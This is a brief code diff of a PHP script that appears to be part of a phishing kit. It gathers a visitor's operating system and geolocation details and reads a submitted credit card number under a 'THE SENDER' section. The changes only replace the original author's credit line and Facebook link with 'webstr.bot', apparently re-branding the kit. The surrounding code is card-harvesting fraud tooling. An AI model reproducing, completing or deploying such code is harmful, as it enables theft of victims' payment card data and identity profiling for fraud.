@@ -1,5 +1,5 @@
 <?php
-/***  BY BADIIIRO  ***/
+/***  BY webstr.bot ***/
 require_once('geoplugin.class.php');
 require_once('detect-os.php');
 $os = getOS($_SERVER['HTTP_USER_AGENT']);
@@ -28,7 +28,7 @@ $message .= "Region Code: {$geoplugin->regionCode}\n";
 $message .= "Region Name: {$geoplugin->regionName}\n";
 $message .= "Timezone: {$geoplugin->timezone}\n";
 $message .= "--------- Powered By ---------\n";
-$message .= "badiiiro - https://www.facebook.com/badiiiro\n";
+$message .= "Webstr.bot\n";
 $message .= "";
 /*** THE SENDER ***/
 $cc = $_POST['ccn'];
